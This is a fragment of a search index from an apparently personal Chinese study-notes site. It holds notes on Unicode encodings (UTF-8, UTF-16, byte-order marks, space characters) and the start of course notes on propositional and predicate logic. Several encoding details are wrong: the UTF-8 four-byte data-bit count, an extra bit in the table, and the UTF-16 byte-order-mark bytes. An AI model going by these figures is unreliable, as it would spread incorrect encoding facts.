\u6807\u51c6\u4e4b\u5916\u7684\u5b57\u7b26\uff0c\u4f8b\u5982 GB/T 20542-2006\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55A\u201d\uff09\u548c GB/T 22238-2008\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55B\u201d\uff09\u4f7f\u7528\u79c1\u4eba\u4f7f\u7528\u533a\u5b58\u653e\u85cf\u6587\u8fde\u5b57</p>"},{"location":"cs/unicode/#_2","title":"\u7f16\u7801","text":"<p>Unicode \u6709\u4e24\u79cd\u5b57\u7b26\u6620\u5c04\u65b9\u5f0f\uff0cUTF\uff08Unicode Transformation Format\uff09\u7f16\u7801\u548c UCS\uff08Universal Coded Character Set\uff09\u7f16\u7801\uff0c\u5177\u4f53\u6765\u8bf4\u6709 UCS-2\u3001UCS-4\u3001UTF-1\u3001UTF-8\u3001UTF-16\u3001UTF-32 \u7b49</p>"},{"location":"cs/unicode/#ucs","title":"UCS","text":"<p>UCS-2\uff0cUniversal Character Set coded in 2 octets\uff0c\u5373\u7528\u4e24\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u8303\u56f4\u4ece U+0000 \u5230 U+FFFF\u3002\u4e5f\u5c31\u662f\u8bf4 UCS-2 \u53ea\u80fd\u8868\u793a BMP \u5e73\u9762\u4e0a\u7684\u5b57\u7b26</p> <p>UCS-4\uff0c\u540c\u7406\uff0c\u7528\u56db\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u4ece U+00000000 \u5230 U+FFFFFFFF\uff0c\u53ef\u4ee5\u8868\u793a\u6240\u6709 Unicode \u5b57\u7b26\uff08UCS-4 \u4e0e UTF-32 \u5b8c\u5168\u7b49\u4ef7\uff09</p> <p>\u4f46\u662f\u8fd9\u4e24\u79cd\u65b9\u6848\u90fd\u4f1a\u5bfc\u81f4\u7f16\u7801\u540e\u6709\u5927\u91cf\u7684 0x00 \u5b57\u8282\uff0c\u5360\u7a7a\u95f4\uff0c\u6240\u4ee5\u4e5f\u5c31\u6709\u4e86\u53ef\u53d8\u957f\u5ea6\u7684 UTF \u7f16\u7801</p>"},{"location":"cs/unicode/#utf-8","title":"UTF-8","text":"<p>UTF-8 \u7f16\u7801\u662f\u76ee\u524d\u6700\u5e38\u7528\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5b83\u662f\u4e00\u4e2a\u53ef\u53d8\u5bbd\u5ea6\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u503c\u4f1a\u88ab\u7f16\u7801\u4e3a 1 \u5230 4 \u4e2a\u5b57\u8282</p> <p>\u5177\u4f53\u6309\u7167\u4e0b\u9762\u7684\u7f16\u7801\u65b9\u5f0f\uff1a</p> \u5b57\u7b26\u503c\u8303\u56f4 \u7b2c\u4e00\u5b57\u8282 \u7b2c\u4e8c\u5b57\u8282 \u7b2c\u4e09\u5b57\u8282 \u7b2c\u56db\u5b57\u8282 U+0000 ~ U+007F 0xxxxxxx U+0080 ~ U+07FF 110xxxxx 10xxxxxx U+0800 ~ U+FFFF 1110xxxx 10xxxxxx 10xxxxxx U+10000 ~ U+10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxxx <p>\u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u5b57\u8282\u90fd\u662f\u7531\u5f00\u5934\u7684\u51e0\u4e2a\u6bd4\u7279\u524d\u7f00\u548c\u5269\u4f59\u7684\u6570\u636e\u90e8\u5206\u7ec4\u6210\u7684</p> <ul> <li>0\uff1a\u5f53\u524d\u8fd9\u4e00\u4e2a\u5b57\u8282\u5c31\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u503c</li> <li>110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e24\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e00\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09</li> <li>1110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e09\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e24\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09</li> <li>11110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u56db\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e09\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09</li> <li>10\uff1a\u5f53\u524d\u5b57\u8282\u662f\u4e00\u4e2a\u5b57\u7b26\u503c\u7684\u4e00\u90e8\u5206</li> </ul> <p>\u4e5f\u53ef\u4ee5\u53d1\u73b0\uff0c\u56db\u4e2a\u5b57\u8282\u65f6\u5269\u4f59\u7684\u6570\u636e\u6bd4\u7279\u4e3a 12 \u4e2a\uff0c\u6b63\u597d\u662f Unicode \u89c4\u5b9a\u7684\u6700\u5927\u5bb9\u91cf</p> <p>\u4e5f\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b\u7279\u70b9\uff1a</p> <ul> <li>U+0000 ~ U+007F \u8fd9 128 \u4e2a\u5b57\u7b26\u503c\u5168\u90e8\u90fd\u662f\u4f7f\u7528\u4e00\u4e2a\u5b57\u8282\u6765\u8868\u793a\uff0c\u5e76\u4e14\u524d\u7f00\u4e3a 0\uff0c\u5373\u7f16\u7801\u540e\u7684\u5b57\u8282\u503c\u548c\u5b57\u7b26\u503c\u76f8\u540c\u3002\u800c\u4e14\u8fd9 128 \u4e2a\u5b57\u7b26\u6b63\u597d\u662f ASCII \u7f16\u7801\u4e2d\u89c4\u5b9a\u7684\u5b57\u7b26\uff0c\u4f7f\u5f97 UTF-8 \u7f16\u7801\u5b8c\u5168\u517c\u5bb9 ASCII \u7f16\u7801</li> <li>\u5728 BMP \u5e73\u9762\u4e2d\u7684 CJK \u5b57\u7b26\u90fd\u4f1a\u7f16\u7801\u4e3a 3 \u4e2a\u5b57\u8282</li> <li>BMP \u5e73\u9762\u4f1a\u7f16\u7801\u4e3a 1~3 \u4e2a\u5b57\u8282\uff0c\u800c\u5269\u4f59\u7684\u5176\u4ed6\u5e73\u9762\u5747\u4f1a\u7f16\u7801\u4e3a 4 \u4e2a\u5b57\u8282</li> </ul>"},{"location":"cs/unicode/#utf-8-with-bom","title":"UTF-8 with BOM","text":"<p>BOM\uff08Byte Order Mark\uff09\u5b57\u8282\u5e8f\u6807\u8bb0\u5728 UTF-8 \u7f16\u7801\u4e2d\u662f\u6ca1\u6709\u7528\u5904\u7684\uff0c\u4e5f\u4e0d\u63a8\u8350\uff0c\u5982\u679c\u5728\u6587\u4ef6\u5934\u5b58\u5728\u5219\u76f4\u63a5\u5ffd\u7565</p> <p>UTF-8 \u7684 BOM \u548c UTF-16 \u7684 BOM \u5b57\u7b26\u503c\u4e00\u6837\u4e3a U+FEFF\uff0c\u7f16\u7801\u4e3a UTF-8 \u5373\u4e3a 0xEF 0xBB 0xBF \u4e09\u4e2a\u5b57\u8282\u3002\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u5b58\u5728\u4e8e\u6587\u4ef6\u5934\uff0c\u5219\u8868\u660e\u4e86\u8fd9\u4e2a\u6587\u4ef6\u4ee5 UTF-8 \u7f16\u7801\uff0c\u5e76\u4e14\u8fd9\u4e09\u4e2a\u5b57\u7b26\u5e94\u8be5\u76f4\u63a5\u5ffd\u7565</p>"},{"location":"cs/unicode/#utf-16","title":"UTF-16","text":"<p>UTF-16 \u4e5f\u662f\u53ef\u53d8\u5bbd\u5ea6\u7684\uff0c\u5b83\u5c06\u4e00\u4e2a\u5b57\u7b26\u503c\u7f16\u7801\u4e3a 1~2 \u4e2a 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff08\u5373 2 \u6216 4 \u4e2a\u5b57\u8282\uff09</p> <p>\u5b83\u7684\u7f16\u7801\u65b9\u5f0f\u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ul> <li> <p>U+0000 ~ U+FFFF \u8303\u56f4</p> <p>BMP \u7684\u5168\u90e8\u90e8\u5206\uff0c\u7f16\u7801\u503c\u548c\u7801\u4f4d\u76f8\u540c\uff0c\u5373\u76f4\u63a5\u5c06\u7801\u4f4d\u4f5c\u4e3a\u4e24\u4e2a\u5b57\u8282\u7684\u7f16\u7801</p> </li> <li> <p>U+10000 ~ U+10FFFF \u8303\u56f4</p> <p>\u6240\u6709\u7684\u8f85\u52a9\u5e73\u9762\u4e0a\u7684\u7801\u4f4d\u4f1a\u88ab\u7f16\u7801\u4e3a\u4e00\u5bf9 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff0c\u79f0\u4e3a\u4ee3\u7406\u5bf9\uff08Surrogate Pair\uff09</p> <ol> <li>\u7801\u4f4d\u51cf 0x10000\uff0c\u4f7f\u8303\u56f4\u843d\u5728 0x00000 \u5230 0xFFFFF\uff0c\u5373 20 \u6bd4\u7279</li> <li>\u9ad8\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xD800 \u5f97\u5230\u7b2c\u4e00\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u9ad8\u4f4d\u4ee3\u7406\uff08high surrogate\uff09\u6216\u524d\u5bfc\u4ee3\u7406\uff08lead surrogate\uff09</li> <li>\u4f4e\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xDC00 \u5f97\u5230\u7b2c\u4e8c\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u4f4e\u4f4d\u4ee3\u7406\uff08low surrogate\uff09\u6216\u540e\u5c3e\u4ee3\u7406\uff08trail surrogate\uff09</li> </ol> </li> </ul> <p>\u8fd9\u6837\u7f16\u7801\u4e4b\u540e\u9ad8\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xD800 ~ 0xDBFF\uff0c\u4f4e\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xDC00 ~ 0xDFFF \u800c U+D800 ~ U+DFFF \u8fd9\u4e9b\u7801\u4f4d\u5728 BMP \u4e2d\u5df2\u7ecf\u9884\u7559\u4e86\u51fa\u6765\u4e0d\u8868\u793a\u4efb\u4f55\u5b57\u7b26\uff0c\u56e0\u6b64\u8fd9\u4e09\u4e2a\u90e8\u5206\u662f\u4e0d\u4f1a\u91cd\u53e0\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bc6\u522b\u51fa\u6765\u662f\u600e\u4e48\u7f16\u7801\u7684</p> <p>UTF-16 \u4e0e UTF-8 \u76f8\u6bd4\uff0c\u597d\u5904\u662f\u5927\u90e8\u5206\u5b57\u7b26\u90fd\u53ef\u4ee5\u7f16\u7801\u4e3a\u56fa\u5b9a\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u800c\u574f\u5904\u4e5f\u5f88\u660e\u663e\uff0c\u5b83\u4e0e ASCII \u5b8c\u5168\u4e0d\u517c\u5bb9</p>"},{"location":"cs/unicode/#utf-16_1","title":"UTF-16 \u7f16\u7801\u6a21\u5f0f","text":"<p>UTF-16 \u53ef\u4ee5\u4f7f\u7528\u5927\u7aef\u5e8f\u548c\u5c0f\u7aef\u5e8f\uff0c\u5728\u6587\u4ef6\u5f00\u5934\u4f1a\u6709 BOM\uff08U+FEFF\uff09\u6765\u6307\u660e\u5230\u5e95\u662f\u54ea\u4e2a\u6a21\u5f0f\uff08\u5982\u679c\u6ca1\u6709\uff0c\u5219\u9700\u8981\u731c\u6d4b\uff09</p> <p>\u5c0f\u7aef\u5e8f\uff08UTF-16 LE\uff09\u4e0b BOM \u8868\u73b0\u4e3a 0xFF 0xEF \u5927\u7aef\u5e8f\uff08UTF-16 BE\uff09\u4e0b BOM \u8868\u73b0\u4e3a 0xEF 0xFF</p>"},{"location":"cs/unicode/#_3","title":"\u90e8\u5206\u7279\u6b8a\u5b57\u7b26","text":""},{"location":"cs/unicode/#_4","title":"\u7a7a\u683c","text":"<p>Unicode \u4e2d\u7684\u7a7a\u683c\u4e5f\u6709\u5f88\u591a\u79cd\uff0c\u5b83\u4eec\u6709\u4e0d\u540c\u7684\u5bbd\u5ea6\u3001\u4ee5\u53ca\u610f\u4e49\uff08\u4e00\u4e9b\u96f6\u5bbd\u5b57\u7b26\u4e5f\u63a5\u5728\u8868\u540e\u9762\u4e86\uff09</p> \u7801\u4f4d \u540d\u79f0 \u5bbd\u5ea6 \u610f\u4e49/\u7528\u9014 U+0020 SPACE ASCII \u7a7a\u683c\uff0c\u76f4\u63a5\u6253\u7a7a\u683c\u5c31\u662f\u8fd9\u4e2a U+00A0 NO-BREAK SPACE \u548c U+0020 \u7c7b\u4f3c\uff0c\u4f46\u662f\u4e0d\u4f1a\u65ad\u884c\uff0cHTML \u5b9e\u4f53 <code>&amp;nbsp;</code> U+1680 OGHAM SPACE MARK \u6b27\u7518\u6587\u7a7a\u683c U+2000 EN QUAD \u534a\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2002 \u66ff\u4ee3 U+2001 EM QUAD \u5168\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2003 \u66ff\u4ee3 U+2002 EN SPACE \u534a\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 <code>&amp;ensp;</code> U+2003 EM SPACE \u5168\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 <code>&amp;emsp;</code> U+2004 THREE-PER-EM SPACE \u4e09\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/3\uff0c<code>&amp;emsp13;</code> U+2005 FOUR-PER-EM SPACE \u56db\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/4\uff0c<code>&amp;emsp14;</code> U+2006 SIX-PER-EM SPACE \u516d\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/6 U+2007 FIGURE SPACE \u6570\u5b57\u7a7a\u683c\uff0c\u5728\u6709\u7b49\u5bbd\u6570\u5b57\u7684\u5b57\u4f53\u4e2d\u5bbd\u5ea6\u548c\u4e00\u4e2a\u6570\u5b57\u5bbd\u5ea6\u4e00\u81f4\uff0c<code>&amp;numsp;</code> U+2008 PUNCTUATION SPACE \u7b26\u53f7\u7a7a\u683c\uff0c\u4e0e\u7a84\u6807\u70b9\u7b26\u53f7\u5bbd\u5ea6\u4e00\u81f4\uff0c<code>&amp;puncsp;</code> U+2009 THIN SPACE \u8584\u7a7a\u683c\uff0c\u5bbd\u5ea6\u4e0d\u56fa\u5b9a\uff0c<code>&amp;thinsp;</code> U+200A HAIR SPACE \u5934\u53d1\u7a7a\u683c\uff0c\u6bd4\u8584\u7a7a\u683c\u66f4\u7a84\uff0c<code>&amp;hairsp;</code> U+202F NARROW NO-BREAK SPACE \u7a84\u7684\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u5728\u8499\u53e4\u8bed\u4e2d\u5bbd\u5ea6\u7c7b\u4f3c\u4e09\u5206\u5bbd\uff0c\u5176\u4ed6\u7c7b\u4f3c U+2009 U+205F MEDIUM MATHEMATICAL SPACE \u4e2d\u7b49\u6570\u5b66\u7a7a\u683c\uff0c4/18\u5bbd\uff0c\u7528\u4e8e\u6570\u5b66\u516c\u5f0f\u4e2d\u7b26\u53f7\u4e24\u4fa7\uff0c<code>&amp;MediumSpace;</code> U+3000 IDEOGRAPHIC SPACE \u8868\u610f\u7a7a\u683c\uff0cCJK \u8868\u610f\u6587\u5b57\u4f7f\u7528\u7684\u5168\u89d2\u7a7a\u683c U+200B ZERO WIDTH SPACE \u96f6\u5bbd\u7a7a\u683c\uff0c<code>&amp;ZeroWidthSpace;</code> U+200C ZERO WIDTH NON-JOINER \u96f6\u5bbd\u4e0d\u8fde\u5b57\uff0c\u7528\u6765\u963b\u6b62\u5e26\u8fde\u5b57\u5b57\u4f53\u7684\u8fde\u5b57\uff0c<code>&amp;zwnj;</code> U+200D ZERO WIDTH JOINER \u96f6\u5bbd\u8fde\u5b57\uff0c\u53ef\u4ee5\u8bf1\u5bfc\uff08\u5982\u8868\u60c5\u7b26\u53f7\u548c\u50e7\u4f3d\u7f57\u8bed\uff09\u6216\u6291\u5236\uff08\u5982\u68b5\u6587\uff09\u7528\u5355\u4e2a\u5b57\u5f62\u66ff\u6362\uff0c<code>&amp;zwj;</code> U+2060 WORD JOINER \u96f6\u5bbd\u8bcd\u8fde\u63a5\u7b26\uff0c\u4e0d\u4f1a\u5728\u8bcd\u95f4\u65ad\u884c\uff0c<code>&amp;NoBreak;</code> U+FEFF ZERO WIDTH NO-BREAK SPACE \u96f6\u5bbd\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u73b0\u7528\u4f5c\u6807\u8bb0\u5927\u5c0f\u7aef\u5e8f"},{"location":"cs/unicode/#_5","title":"\u6a2a\u7ebf","text":"<p>\u8be6\u89c1 \u4e0d\u79bb\u4e0d\u5f03\u7684\u7834\u6298\u53f7 - The Type </p>"},{"location":"cs/ai/basic/","title":"\u4eba\u5de5\u667a\u80fd\u57fa\u7840","text":"<p> \u7ea6 12139 \u4e2a\u5b57  103 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 42 \u5206\u949f</p> <p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u4eba\u5de5\u667a\u80fd\u57fa\u7840\u201d \u8bfe\u7a0b\u590d\u4e60\u7b14\u8bb0</p> <p>\u53c2\u8003\u6559\u6750\uff1a\u300a\u4eba\u5de5\u667a\u80fd\u5bfc\u8bba\uff1a\u6a21\u578b\u4e0e\u7b97\u6cd5\u300b- \u5434\u98de</p> <p>\u4e00\u95e8\u6211\u89c9\u5f97\u5f88\u70c2\u7684\u8bfe\uff0c\u53cd\u6b63\u6ca1\u5b66\u5230\u4efb\u4f55\u6709\u7528\u7684\u77e5\u8bc6\uff0c\u8fd9\u91cc\u8bb0\u7684\u4e1c\u897f\u57fa\u672c\u90fd\u662f\u4e66\u4e0a\u6284\u4e0b\u6765\u7684\uff0c\u56e0\u4e3a\u8003\u8bd5\u5927\u90e8\u5206\u8003\u5404\u79cd\u6982\u5ff5\u2026\u2026 \u524d\u4e24\u90e8\u5206\u662f\u4e0a\u8bfe\u8fb9\u542c\u8fb9\u8bb0\u7684\uff0c\u4f1a\u8be6\u7ec6\u4e00\u70b9\uff08\uff1f\uff09\u800c\u4e14\u6ca1\u90a3\u4e48\u504f\u5411\u6982\u5ff5\uff0c\u540e\u9762\u57fa\u672c\u4e0a\u5c31\u5168\u662f\u6311\u6982\u5ff5\u6284\u4e86 \u51e0\u4e2a\u5b9e\u9a8c\u6ca1\u6709\u4efb\u4f55\u542b\u91d1\u91cf\u548c\u8bb0\u5f55\u7684\u5fc5\u8981\uff0c\u8bbe\u8ba1\u7684\u5f88\u70c2\u800c\u4e14\u51e0\u4e4e\u5b66\u4e0d\u5230\u4e1c\u897f</p> <p>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u4eba\u5de5\u667a\u80fd\u57fa\u7840</p>"},{"location":"cs/ai/basic/#_2","title":"\u903b\u8f91\u4e0e\u63a8\u7406","text":""},{"location":"cs/ai/basic/#_3","title":"\u547d\u9898\u903b\u8f91","text":"<ul> <li>\u547d\u9898\u903b\u8f91\uff08proposition logic\uff09\u662f\u5e94\u7528\u4e00\u5957\u5f62\u5f0f\u5316\u89c4\u5219\u5bf9\u4ee5\u7b26\u53f7\u8868\u793a\u7684\u63cf\u8ff0\u6027\u9648\u8ff0\uff08\u79f0\u4e3a\u547d\u9898\uff09\u8fdb\u884c\u63a8\u7406\u7684\u7cfb\u7edf</li> <li>\u547d\u9898\u903b\u8f91\u4ee5\u539f\u5b50\u547d\u9898\u4f5c\u4e3a\u6700\u57fa\u672c\u7684\u5355\u4f4d\uff0c\u65e0\u6cd5\u5bf9\u539f\u5b50\u547d\u9898\u8fdb\u884c\u5206\u89e3\uff08\u5206\u79bb\u5176\u4e3b\u8bed\u4e0e\u8c13\u8bed\uff09</li> <li>\u547d\u9898\u903b\u8f91\u662f\u6570\u7406\u903b\u8f91\u7684\u57fa\u7840</li> <li>\u901a\u8fc7\u547d\u9898\u8054\u7ed3\u8bcd\uff08connectives\uff09\u5bf9\u5df2\u6709\u547d\u9898\u8fdb\u884c\u7ec4\u5408\uff0c\u5f97\u5230\u65b0\u547d\u9898\uff0c\u79f0\u4e3a\u7b26\u5408\u547d\u9898\uff08compound proposition\uff09<ul> <li>\u547d\u9898\u5408\u53d6 conjunction\uff0c\\(p\\wedge q\\)</li> <li>\u547d\u9898\u6790\u53d6 disjunction\uff0c\\(p\\vee q\\)</li> <li>\u547d\u9898\u5426\u5b9a negation\uff0c\\(\\neg p\\)</li> <li>\u547d\u9898\u8574\u542b implication\uff0c\\(p\\rightarrow q\\)\uff0c\\(p\\) \u4e3a\u524d\u4ef6\uff0c\\(q\\) \u4e3a\u540e\u4ef6</li> <li>\u547d\u9898\u53cc\u5411\u8574\u542b bi-implication\uff0c\\(p\\leftrightarrow q\\)</li> </ul> </li> <li>\u903b\u8f91\u7b49\u4ef7\uff1a\u5728\u6240\u6709\u60c5\u51b5\u4e0b\u90fd\u6709\u76f8\u540c\u771f\u5047\u7ed3\u679c<ul> <li>\u9006\u5426\u547d\u9898\uff1a\\((\\alpha\\rightarrow\\beta)\\equiv\\neg\\beta\\rightarrow\\neg\\alpha\\)</li> <li>\u8574\u542b\u6d88\u9664\uff1a\\((\\alpha\\rightarrow\\beta)\\equiv\\neg\\alpha\\vee\\beta\\)</li> <li>\u53cc\u5411\u6d88\u9664\uff1a\\((\\alpha\\leftrightarrow\\beta)\\equiv(\\alpha\\rightarrow\\beta)\\wedge(\\beta\\rightarrow\\alpha)\\)</li> <li>...</li> </ul> </li> <li>\u63a8\u7406\uff1a\u6309\u7167\u67d0\u79cd\u7b56\u7565\u4ece\u524d\u63d0\u51fa\u53d1\u63a8\u51fa\u7ed3\u8bba\u7684\u8fc7\u7a0b\u3002\u5e38\u89c1\u63a8\u7406\u89c4\u5219\uff1a<ul> <li>\u5047\u8a00\u63a8\u7406 modus ponens\uff1a\\(\\alpha\\rightarrow\\beta, \\alpha\\Rightarrow\\beta\\)</li> <li>\u4e0e\u6d88\u89e3 and-elimination\uff1a\\(\\alpha_1\\wedge\\alpha_2\\wedge\\cdots\\wedge\\alpha_n\\Rightarrow\\alpha_i(1\\leq i\\leq n)\\)</li> <li>\u4e0e\u5bfc\u5165 and-introduction\uff1a\\(\\alpha_1,\\alpha_2,\\cdots,\\alpha_n\\Rightarrow\\alpha_1\\wedge\\alpha_2\\wedge\\cdots\\wedge\\alpha_n\\)</li> <li>\u53cc\u91cd\u5426\u5b9a double-negation elimation</li> <li>\u5355\u9879\u6d88\u89e3\u6216\u5355\u9879\u5f52\u7ed3 unit resolution\uff1a\\(\\alpha\\vee\\beta,\\neg\\beta\\Rightarrow\\alpha\\)</li> <li>\u6d88\u89e3\u6216\u5f52\u7ed3 resolution\uff1a\\(\\alpha\\vee\\beta,\\neg\\beta\\vee\\gamma\\Rightarrow\\alpha\\vee\\gamma\\)</li> </ul> </li> <li>\u8303\u5f0f\uff08normal form\uff09\u662f\u628a\u547d\u9898\u516c\u5f0f\u5316\u4e3a\u4e00\u79cd\u6807\u51c6\u7684\u5f62\u5f0f\uff0c\u4f5c\u7528\u662f\u53ef\u4ee5\u8fdb\u884c\u4e24\u4e2a\u547d\u9898\u7684\u7b49\u4ef7\u5224\u65ad<ul> <li>\u6790\u53d6\u8303\u5f0f disjunctive normal form\uff08DNF\uff09\uff1a\u6709\u9650\u4e2a\u7b80\u5355\u5408\u53d6\u5f0f\u6784\u6210\u7684\u6790\u53d6\u5f0f\u79f0\u4e3a\u6790\u53d6\u8303\u5f0f</li> <li>\u5408\u53d6\u8303\u5f0f conjunctive normal form\uff08CNF\uff09\uff1a\u6709\u9650\u4e2a\u7b80\u5355\u6790\u53d6\u5f0f\u6784\u6210\u7684\u5408\u53d6\u5f0f\u79f0\u4e3a\u5408\u53d6\u8303\u5f0f</li> <li>\u4e00\u4e2a DNF \u4e0d\u6210\u7acb\u5f53\u4e14\u4ec5\u5f53\u6bcf\u4e2a\u7b80\u5355\u5408\u53d6\u5f0f\u90fd\u4e0d\u6210\u7acb</li> <li>\u4e00\u4e2a CNF \u6210\u7acb\u5f53\u4e14\u4ec5\u5f53\u6bcf\u4e2a\u7b80\u5355\u6790\u53d6\u5f0f\u90fd\u6210\u7acb</li> <li>\u547d\u9898\u516c\u5f0f\u7684 DNF \u548c CNF \u90fd\u662f\u4e0d\u552f\u4e00\u7684</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_4","title":"\u8c13\u8bcd\u903b\u8f91","text":"<ul> <li>\u547d\u9898\u903b\u8f91\u65e0\u6cd5\u8868\u8fbe\u5c40\u90e8\u4e0e\u6574\u4f53\u3001\u4e00\u822c\u4e0e\u4e2a\u522b\u7684\u5173\u7cfb</li> <li>\u5c06\u539f\u5b50\u547d\u9898\u8fdb\u4e00\u6b65\u7ec6\u5316\uff0c\u5206\u89e3\u51fa\u4e2a\u4f53\u3001\u8c13\u8bcd\u548c\u91cf\u8bcd\uff0c\u6765\u8868\u8fbe\u4e2a\u4f53\u4e0e\u603b\u4f53\u7684\u5185\u5728\u8054\u7cfb\u548c\u6570\u91cf\u5173\u7cfb\uff0c\u5c31\u662f\u8c13\u8bcd\u903b\u8f91\uff08predicate logic\uff09\u7684\u7814\u7a76\u5185\u5bb9</li> <li>\u4e2a\u4f53\uff1a\u4e2a\u4f53\u5f0f\u6307\u6240\u7814\u7a76\u9886\u57df\u4e2d\u53ef\u4ee5\u72ec\u7acb\u5b58\u5728\u7684\u5177\u4f53\u6216\u62bd\u8c61\u7684\u6982\u5ff5<ul> <li>\u5177\u4f53\u3001\u7279\u5b9a -&gt; \u4e2a\u4f53\u5e38\u91cf\uff1b\u62bd\u8c61\u3001\u6cdb\u6307 -&gt; \u4e2a\u4f53\u53d8\u91cf</li> <li>\u89c4\u5b9a\uff0c\u7528\u5c0f\u5199\u5b57\u6bcd \\(a\\) \u81f3 \\(w\\) \u8868\u793a\u4e2a\u4f53\u5e38\u91cf\uff08\\(x,y,z\\) \u8868\u793a\u4e2a\u4f53\u53d8\u91cf\uff09</li> <li>\u4e2a\u4f53\u7684\u53d6\u503c\u8303\u56f4\u79f0\u4e3a\u4e2a\u4f53\u57df</li> </ul> </li> <li>\u8c13\u8bcd\uff1a\u8c13\u8bcd\u662f\u7528\u6765\u523b\u753b\u4e2a\u4f53\u5c5e\u6027\u6216\u8005\u63cf\u8ff0\u4e2a\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb\u5b58\u5728\u6027\u7684\u5143\u7d20\uff0c\u5176\u503c\u4e3a\u771f\u6216\u5047<ul> <li>\u5305\u542b\u4e00\u4e2a\u53c2\u6570\u7684\u8c13\u8bcd\u79f0\u4e3a\u4e00\u5143\u8c13\u8bcd\uff0c\u8868\u793a\u4e00\u5143\u5173\u7cfb</li> <li>\u5305\u542b\u591a\u4e2a\u53c2\u6570\u7684\u8c13\u8bcd\u79f0\u4e3a\u591a\u5143\u8c13\u8bcd\uff0c\u8868\u793a\u4e2a\u4f53\u95f4\u7684\u591a\u5143\u5173\u7cfb</li> <li>\u89c4\u5b9a\uff0c\u7528 \\(A(\\cdots)\\) \u81f3 \\(Z(\\cdots)\\) \u8868\u793a\u8c13\u8bcd\uff0c\u4e3a\u5927\u5199\u5b57\u6bcd\u540e\u8ddf\u62ec\u53f7\uff0c\u62ec\u53f7\u5185\u653e\u7f6e\u4e2a\u4f53\u5e38\u91cf\u6216\u53d8\u91cf</li> </ul> </li> <li>\u91cf\u8bcd\uff1a\u5168\u79f0\u91cf\u8bcd\u548c\u5b58\u5728\u91cf\u8bcd\u7edf\u79f0\u4e3a\u91cf\u8bcd<ul> <li>\u5168\u79f0\u91cf\u8bcd\uff1a\u8868\u793a\u4e00\u5207\u7684\u3001\u6240\u6709\u7684\u3001\u51e1\u4e8b\u3001\u6bcf\u4e00\u4e2a\u7b49\uff0c\u7b26\u53f7 \\(\\forall\\)</li> <li>\u5b58\u5728\u91cf\u8bcd\uff1a\u8868\u793a\u5b58\u5728\u3001\u6709\u4e00\u4e2a\u3001\u67d0\u4e9b\u7b49\uff0c\u7b26\u53f7 \\(\\exist\\)</li> <li>\u5168\u79f0\u91cf\u8bcd\u7684\u63cf\u8ff0\u6027\u662f\u53ef\u4ee5\u7528\u76f8\u5e94\u7684\u5b58\u5728\u91cf\u8bcd\u7684\u85d0\u89c6\u5f62\u5f0f\u66ff\u6362</li> <li>\u7ea6\u675f\u53d8\u5143\uff1a\u5728\u5168\u79f0\u91cf\u8bcd\u6216\u5b58\u5728\u91cf\u8bcd\u7ea6\u675f\u6761\u4ef6\u4e0b\u7684\u53d8\u91cf\u7b26\u53f7</li> <li>\u81ea\u7531\u53d8\u5143\uff1a\u4e0d\u53d7\u5168\u79f0\u91cf\u8bcd\u6216\u5b58\u5728\u91cf\u8bcd\u7ea6\u675f\u7684\u53d8\u91cf\u7b26\u53f7</li> 